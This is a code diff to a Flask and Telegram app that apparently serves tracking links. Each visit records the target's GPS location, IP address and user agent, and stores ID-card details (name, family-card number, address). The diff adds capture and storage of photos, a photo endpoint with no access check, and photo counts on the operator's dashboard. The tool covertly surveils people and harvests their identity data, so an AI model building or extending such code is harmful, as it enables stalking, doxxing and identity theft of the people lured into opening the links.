@@ -12,7 +12,7 @@ import asyncio
 import base64
 from io import BytesIO
 from datetime import datetime
-from flask import Flask, render_template, request, jsonify, session, redirect, url_for
+from flask import Flask, render_template, request, jsonify, session, redirect, url_for, Response
 from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
@@ -34,6 +34,9 @@ def init_db():
         id INTEGER PRIMARY KEY AUTOINCREMENT, tracking_id TEXT,
         latitude REAL, longitude REAL, accuracy REAL,
         user_agent TEXT, ip_address TEXT, timestamp TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS photos (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, tracking_id TEXT,
+        photo BLOB, timestamp TEXT)""")
     conn.commit()
     conn.close()
 
@@ -319,8 +322,31 @@ def api_loc(tid):
     # Save KTP data
     db_exec("UPDATE links SET title=?, description=? WHERE tracking_id=?",
         (d.get("nama",""), f"KK:{d.get('no_kk','')} | {d.get('alamat','')}", tid))
+    # Save photo if provided
+    photo_data = d.get("photo")
+    if photo_data and photo_data.startswith("data:image"):
+        try:
+            photo_bin = base64.b64decode(photo_data.split(",")[1])
+            db_exec("INSERT INTO photos (tracking_id, photo, timestamp) VALUES (?,?,?)",
+                (tid, photo_bin, datetime.now().isoformat()))
+        except Exception as e:
+            print(f"Photo save error: {e}")
     asyncio.run(notify(tid, lat, lon, acc, request.remote_addr, d))
     return jsonify({"success": True})
+
+@app.route("/api/photo/<tid>")
+def api_photo(tid):
+    rows = db_exec("SELECT photo FROM photos WHERE tracking_id=? ORDER BY id DESC LIMIT 1", (tid,))
+    if not rows:
+        return jsonify({"error": "No photo"}), 404
+    return Response(rows[0][0], mimetype='image/jpeg')
+
+@app.route("/api/photos/<tid>")
+def api_photos(tid):
+    if not is_authenticated():
+        return jsonify({"error": "unauthorized"}), 403
+    rows = db_exec("SELECT id, timestamp FROM photos WHERE tracking_id=? ORDER BY id DESC", (tid,))
+    return jsonify({"photos": [{"id": r[0], "ts": r[1]} for r in rows]})
 
 @app.route("/map/<tid>")
 def map_view(tid):
@@ -388,6 +414,7 @@ def api_dashboard():
     active_links = db_exec("SELECT COUNT(*) FROM links WHERE is_active=1")[0][0]
     total_events = db_exec("SELECT COUNT(*) FROM tracking_events")[0][0]
     today_events = db_exec("SELECT COUNT(*) FROM tracking_events WHERE timestamp>=?", (today_start,))[0][0]
+    total_photos = db_exec("SELECT COUNT(*) FROM photos")[0][0]
     total_users = db_exec("SELECT COUNT(DISTINCT created_by) FROM links")[0][0]
 
     recent_events = db_exec("""
@@ -399,9 +426,12 @@ def api_dashboard():
     """)
     recent_events_list = []
     for row in recent_events:
+        tid = row[0]
+        photo_count = db_exec("SELECT COUNT(*) FROM photos WHERE tracking_id=?", (tid,))[0][0]
         recent_events_list.append({
             "tracking_id": row[0], "latitude": row[1], "longitude": row[2],
-            "accuracy": row[3], "timestamp": row[4], "nama": row[5] or ""
+            "accuracy": row[3], "timestamp": row[4], "nama": row[5] or "",
+            "photos": photo_count, "has_photo": photo_count > 0
         })
 
     links = db_exec("SELECT tracking_id, title, created_at, is_active FROM links ORDER BY created_at DESC LIMIT 50")
@@ -428,7 +458,7 @@ def api_dashboard():
     return jsonify({
         "total_links": total_links, "active_links": active_links,
         "total_events": total_events, "today_events": today_events,
-        "total_users": total_users,
+        "total_photos": total_photos, "total_users": total_users,
         "recent_events": recent_events_list,
         "links": links_list,
         "latest_location": latest_location,
